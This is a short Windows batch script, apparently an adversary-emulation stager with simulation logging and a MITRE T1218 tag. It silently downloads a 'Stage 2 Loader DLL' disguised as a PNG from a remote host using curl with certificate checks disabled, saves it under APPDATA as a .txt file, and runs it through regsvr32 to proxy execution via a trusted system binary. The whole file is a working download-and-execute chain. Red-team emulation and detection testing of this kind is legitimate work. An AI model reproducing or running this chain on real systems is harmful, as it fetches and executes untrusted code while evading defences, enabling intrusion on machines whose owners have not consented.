@echo off
SETLOCAL EnableDelayedExpansion

REM --- Placeholder constant declarations (random-named SET variables) ---
SET a0=%APPDATA%\11008\af4005ae
SET b1=00beb700.txt
SET c2=https://10.0.0.49/stage/2/icon.png?11008-7
SET d3=BALAM-S2B
SET e4=11008
SET f5=7
SET g6=%PUBLIC%\\macula-simulations.log

REM --- Cache timestamp ---
SET tsvar=!DATE!/!TIME!

REM --- Heartbeat: download Stage 2 Loader DLL ---
echo [!tsvar!][DEBUG][!d3!][!e4!]: heartbeat_start>> "!g6!" 2>nul
curl -k -s -o "!a0!\!b1!" "!c2!" >nul 2>&1
if errorlevel 1 (
    set hb_result=FAIL
    set hb_err=!errorlevel!
) else (
    set hb_result=OK
    set hb_err=
)
echo [!tsvar!][DEBUG][!d3!][!e4!]: heartbeat_complete=!hb_result!>> "!g6!" 2>nul

REM --- Change working directory to output dir ---
echo [!tsvar!][DEBUG][!d3!][!e4!]: chdir_start>> "!g6!" 2>nul
cd /d "!a0!" >nul 2>&1
if errorlevel 1 (
    set cd_result=1
) else (
    set cd_result=0
)
echo [!tsvar!][DEBUG][!d3!][!e4!]: chdir_result=!cd_result!>> "!g6!" 2>nul

REM --- Invoke Stage 2 Loader DLL via regsvr32 LOLBIN ---
echo [!tsvar!][DEBUG][!d3!][!e4!]: rundll32_start>> "!g6!" 2>nul
regsvr32.exe /s "!b1!" >nul 2>&1
if errorlevel 1 (
    set run_result=FAIL
    set run_err=!errorlevel!
) else (
    set run_result=OK
    set run_err=
)
echo [!tsvar!][DEBUG][!d3!][!e4!]: rundll32_result=!run_result!>> "!g6!" 2>nul

REM --- TTP logging ---
echo [!tsvar!][TTP][!d3!][!e4!]: T1218^|System Binary Proxy Execution=!run_result!:!run_err!>> "!g6!" 2>nul

ENDLOCAL